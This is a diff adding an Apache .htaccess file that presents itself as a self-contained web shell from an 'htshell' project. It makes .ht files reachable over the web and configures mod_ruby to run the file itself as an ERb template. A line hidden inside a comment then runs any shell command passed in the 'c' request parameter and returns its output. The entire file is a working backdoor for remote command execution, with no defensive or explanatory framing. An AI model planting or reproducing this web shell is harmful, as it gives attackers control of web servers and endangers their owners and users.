@@ -1,0 +1,19 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+<IfModule mod_ruby.c>
+  RubyRequire apache/erb-run
+  RubySafeLevel 0 
+  AddType text/html .htaccess
+  <Files *.htaccess>
+    SetHandler ruby-object
+    RubyHandler Apache::ERbRun.instance
+  </Files>
+</IfModule>
+
+# <% require 'cgi';cgi = CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` %>
